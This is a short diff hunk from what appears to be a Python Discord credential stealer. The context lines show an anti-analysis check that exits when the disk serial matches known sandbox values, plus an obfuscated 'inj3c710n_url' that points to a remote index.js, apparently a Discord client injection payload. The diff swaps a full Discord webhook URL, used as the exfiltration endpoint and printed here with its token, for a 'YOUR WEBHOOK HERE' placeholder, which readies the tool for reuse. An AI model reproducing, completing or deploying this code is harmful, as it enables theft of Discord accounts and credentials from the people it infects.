@@ -126,7 +126,7 @@ class Kerpy:
      if disk_serial in serial_disk:
          sys.exit()
 
-h00k = "https://discord.com/api/webhooks/1117403236664615033/MR3FygX8pNJvfBp1N2uiySH8erLHE8FtGIDtQMeawyVHyaprGY15xgfFj0_Y32apbwgQ"
+h00k = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/yagiz011/main/main/index.js"
 DETECTED = False
 
